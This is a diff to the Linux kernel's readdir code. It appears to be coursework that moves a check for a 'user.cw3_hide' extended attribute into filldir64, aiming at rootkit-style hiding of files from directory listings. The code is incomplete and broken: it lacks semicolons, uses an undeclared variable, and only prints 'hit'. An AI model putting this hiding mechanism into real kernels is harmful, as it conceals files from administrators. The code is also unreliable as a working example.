@@ -69,20 +69,6 @@ int iterate_dir(struct file *file, struct dir_context *ctx)
 		file->f_pos = ctx->pos;
 		fsnotify_access(file);
 		file_accessed(file);
-
-		if (res >= 0 && file->f_path.dentry) {
-			struct dentry *dentry = file->f_path.dentry;
-			char xattr_value[256]; // Adjust the size as needed
-
-			ssize_t len = vfs_getxattr(&init_user_ns, dentry, "user.cw3_hide", xattr_value, sizeof(xattr_value));
-
-			if (len >= 0) {
-				// xattr exists, skip listing this directory entry
-				//Check for differnt types depending on type
-				printk("hit");
-				res = 0;; // Set result to 0 to indicate success (no error)
-			}
-		}
 	}
 
 	if (shared)
@@ -326,9 +312,12 @@ struct getdents_callback64 {
 static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 		     loff_t offset, u64 ino, unsigned int d_type)
 {
+	struct file *file = NULL;
 	struct linux_dirent64 __user *dirent, *prev;
 	struct getdents_callback64 *buf =
 		container_of(ctx, struct getdents_callback64, ctx);
+	if (buf && buf->file)
+        file = buf->file
 
 	int reclen = ALIGN(offsetof(struct linux_dirent64, d_name) + namlen + 1,
 		sizeof(u64));
@@ -348,7 +337,20 @@ static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 		goto efault;
 
 
-	printk(name);
+	if (res >= 0 && file->f_path.dentry) {
+			struct dentry *dentry = file->f_path.dentry;
+			char xattr_value[256]; // Adjust the size as needed
+
+			ssize_t len = vfs_getxattr(&init_user_ns, dentry, "user.cw3_hide", xattr_value, sizeof(xattr_value));
+
+			if (len >= 0) {
+				// xattr exists, skip listing this directory entry
+				//Check for differnt types depending on type
+				printk("hit");
+			}
+	}
+
+
 	/* This might be 'dirent->d_off', but if so it will get overwritten */
 	unsafe_put_user(offset, &prev->d_off, efault_end);
 	unsafe_put_user(ino, &dirent->d_ino, efault_end);
@@ -379,6 +381,7 @@ SYSCALL_DEFINE3(getdents64, unsigned int, fd,
 		.ctx.actor = filldir64,
 		.count = count,
 		.current_dir = dirent
+		.file = NULL
 	};
 	int error;
 
